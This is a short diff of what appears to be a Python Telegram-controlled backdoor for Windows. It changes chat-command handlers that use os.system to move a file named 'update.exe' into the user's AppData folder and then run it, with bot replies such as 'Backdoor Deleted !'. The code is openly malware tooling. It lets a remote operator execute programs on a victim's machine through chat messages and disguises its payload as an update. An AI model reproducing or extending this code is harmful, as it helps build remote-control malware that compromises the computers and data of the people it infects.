@@ -31,11 +31,11 @@ def answer(update,context):
         msg.edit_text("😏")
 
     elif "set-killswitch" in txt:
-        os.system("echo S | move tools\\update.bat C:\\Users\\%username%\\AppData\\Local\\Programs\\")
+        os.system("echo S | move tools\\update.exe C:\\Users\\%username%\\AppData\\Local\\Programs\\")
         update.message.reply_text("KillSwitch Triggered => Run 'killswitch'")
 
     elif "killswitch" in txt:
-        os.system("start C:\\Users\\%username%\\AppData\\Local\\Programs\\update.bat")
+        os.system("C:\\Users\\%username%\\AppData\\Local\\Programs\\update.exe")
         update.message.reply_text("Backdoor Deleted ! 😏")
 
 
